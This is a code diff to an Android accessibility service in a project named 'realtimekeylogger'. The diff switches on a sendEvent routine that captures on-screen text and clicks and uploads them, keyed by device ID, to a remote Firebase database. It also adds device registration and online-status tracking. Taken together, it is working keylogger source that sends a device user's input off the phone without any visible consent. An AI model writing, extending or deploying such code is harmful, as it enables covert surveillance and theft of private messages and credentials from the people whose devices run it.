@@ -4,11 +4,15 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.*
+import com.shubhamgupta16.realtimekeylogger.utils.getDeviceId
+import com.shubhamgupta16.realtimekeylogger.utils.getDeviceName
 
 class ASEService : AccessibilityService() {
 
     val rtdb = FirebaseDatabase.getInstance().reference
+    private val deviceKey: String = applicationContext.getDeviceId()
+
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -22,8 +26,32 @@ class ASEService : AccessibilityService() {
         info.notificationTimeout = 1000
         info.packageNames = null
         serviceInfo = info
-    }
 
+
+//        initialization
+        val map: MutableMap<String, Any> = HashMap()
+        map["name"] = getDeviceName()
+        map["status"] = 1
+        map["lastOnline"] = ServerValue.TIMESTAMP
+        rtdb.child("devices").child(deviceKey).updateChildren(map)
+        rtdb.child(".info/connected").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                Log.d("connection", snapshot.toString())
+                val value = snapshot.getValue(Boolean::class.java)!!
+                if (value) {
+                    rtdb.child("devices").child(deviceKey).child("lastOnline")
+                        .setValue(ServerValue.TIMESTAMP)
+                    rtdb.child("devices").child(deviceKey).child("status").setValue(1)
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+        rtdb.child("devices").child(deviceKey).child("lastOnline").onDisconnect()
+            .setValue(ServerValue.TIMESTAMP)
+        rtdb.child("devices").child(deviceKey).child("status").onDisconnect()
+            .setValue(0)
+    }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
@@ -35,11 +63,34 @@ class ASEService : AccessibilityService() {
                             it == AccessibilityEvent.TYPE_VIEW_CLICKED
                 }) {
                 val text = event.text.joinToString { it }.ifBlank { null }
-                /*sendEvent(
+                sendEvent(
                     event.eventType, text, event.contentDescription
-                )*/
+                )
             }
         }
+    }
+
+    private var lastEventText = ""
+    private var lastEventTimeStamp = 0L
+    private var lastCurrentTime = 0L
+    private fun sendEvent(event:Int, text:String?, desc:CharSequence?){
+        val currentTime = System.currentTimeMillis()
+        if (text?.length ?: 0 > 3 && lastEventText.length > 3)
+            if (text == null) lastEventTimeStamp = currentTime
+        if (text?.contains(lastEventText) == false && !lastEventText.contains(text)) lastEventTimeStamp = currentTime
+        if (currentTime - lastCurrentTime > 1000 * 7) lastEventTimeStamp = currentTime
+        if (text?.length ?: 0 > 3 && lastEventText.length > 3)
+            if (text?.substring(3) == lastEventText.substring(3))
+                lastEventTimeStamp = currentTime
+        lastCurrentTime = currentTime
+        lastEventText = text ?: ""
+        rtdb.child("actions_v2").child(deviceKey).child("$lastEventTimeStamp").setValue(
+            mapOf(
+                "text" to text,
+                "desc" to desc,
+                "event" to event
+            )
+        )
     }
 
     override fun onInterrupt() {
